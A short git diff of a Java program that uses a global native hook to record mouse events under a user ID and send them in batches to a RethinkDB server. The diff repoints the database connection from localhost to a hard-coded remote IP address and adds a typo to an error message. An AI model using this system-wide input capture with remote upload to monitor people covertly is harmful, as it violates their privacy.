@@ -46,10 +46,9 @@ public class Main {
 
     public static String user_id;
 
-
     public static  final RethinkDB r = RethinkDB.r;
 
-    private static Connection conn = r.connection().hostname("localhost").connect();
+    private static Connection conn = r.connection().hostname("95.65.87.162").connect();
 
 
     public static void main(String[] args) throws InterruptedException, UnsupportedFlavorException, IOException {
@@ -74,7 +73,7 @@ public class Main {
             GlobalScreen.registerNativeHook();
         }
         catch (NativeHookException ex) {
-            System.err.println("There was a problem registering the native hook.");
+            System.err.println("There was a problems registering the native hook.");
             System.err.println(ex.getMessage());
 
             System.exit(1);
@@ -231,7 +230,6 @@ public class Main {
         mouseEventData.put("mouseRelease", timestamp);
         mouseEventData.put("buttonCode", button);
         mouseData.add(mouseEventData);
-
 
         if (mouseData.size() >= 4) {
             submitMouseData(mouseData);
